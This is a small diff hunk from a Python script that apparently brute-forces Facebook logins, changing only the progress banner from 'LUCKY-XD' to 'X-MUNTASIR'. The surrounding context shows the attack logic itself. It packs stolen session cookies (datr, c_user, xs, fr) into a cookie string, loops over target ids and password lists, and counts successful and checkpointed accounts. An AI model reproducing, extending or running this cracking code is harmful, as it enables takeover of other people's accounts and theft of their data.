@@ -295,7 +295,7 @@ def convert(cookie):
         coki2 = ('datr=%s;sb=%s;c_user=%s;xs=%s;fr=%s'%(cookie['datr'],cookie['sb'],cookie['c_user'],cookie['xs'],cookie['fr']))    
 def ___mixt___(ids,pwv,tl):
     global loop,oks,cps,twf
-    sys.stdout.write(f'\r\033[1;32m~[\033[1;92mLUCKY-XD\033[1;32m]-[\033[1;32m{loop}\033[1;97m/\033[1;32m{str(len(id))}\033[1;32m]-\033[1;32m[\033[1;32mOK:{len(oks)}\033[1;32m] ');sys.stdout.flush()
+    sys.stdout.write(f'\r\033[1;32m~[\033[1;92mX-MUNTASIR\033[1;32m]-[\033[1;32m{loop}\033[1;97m/\033[1;32m{str(len(id))}\033[1;32m]-\033[1;32m[\033[1;32mOK:{len(oks)}\033[1;32m] ');sys.stdout.flush()
     try:
         for pas in pwv:
             data={'adid': str(uuid.uuid4()),
